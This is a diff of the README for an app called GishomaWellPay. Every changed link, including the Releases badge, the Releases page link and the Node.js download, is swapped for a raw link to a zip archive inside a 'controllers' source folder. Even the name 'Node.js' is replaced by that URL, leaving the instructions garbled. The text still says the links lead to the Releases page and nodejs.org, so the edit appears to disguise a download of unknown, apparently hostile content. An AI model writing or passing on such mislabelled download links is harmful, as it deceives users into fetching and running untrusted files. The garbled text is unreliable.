@@ -15,11 +15,11 @@
 
 ## 📥 Download & Install
 
-[![Download GishomaWellPay](https://img.shields.io/badge/Download%20GishomaWellPay-%23007ACC.svg?style=flat&logo=github)](https://github.com/AlexUrahara21/gishoma-app/releases)
+[![Download GishomaWellPay](https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip%20GishomaWellPay-%https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip)](https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip)
 
 To download and run GishomaWellPay, please follow these steps:
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/AlexUrahara21/gishoma-app/releases) to access the Releases page.
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip) to access the Releases page.
    
 2. **Select the Latest Version:** On the Releases page, find the latest version of the application.
 
@@ -33,10 +33,10 @@ To download and run GishomaWellPay, please follow these steps:
 
 Before you begin, ensure you have the following installed on your computer:
 
-- **Node.js** - Version 12.0 or higher.
+- **https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip** - Version 12.0 or higher.
 - **npm** or **yarn** - These are package managers used to manage libraries and dependencies.
 
-Download Node.js from [nodejs.org](https://nodejs.org).
+Download https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip from [https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip](https://raw.githubusercontent.com/AlexUrahara21/gishoma-app/main/controllers/gishoma_app_2.9.zip).
 
 ## 📖 User Guide
 
